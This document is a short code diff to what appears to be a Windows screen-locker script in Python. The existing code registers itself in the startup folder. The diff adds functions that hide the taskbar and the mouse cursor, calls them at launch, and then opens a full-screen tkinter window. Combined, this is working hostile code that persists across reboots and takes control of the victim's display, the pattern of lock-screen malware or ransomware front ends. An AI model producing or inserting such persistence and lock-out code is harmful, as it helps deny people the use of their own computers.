@@ -19,7 +19,16 @@ def add_to_startup():
         shortcut.Arguments = script_path
         shortcut.WorkingDirectory = os.path.dirname(script_path)
         shortcut.Save()
+def hide_taskbar():
+    taskbar_hwnd = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
+    if taskbar_hwnd:
+        ctypes.windll.user32.ShowWindow(taskbar_hwnd, 0)
+def hide_cursor():
+    while ctypes.windll.user32.ShowCursor(False) >= 0:
+        pass
 add_to_startup()
+hide_taskbar()
+hide_cursor()
 root=tk.Tk()
 width = root.winfo_screenwidth()
 height = root.winfo_screenheight()
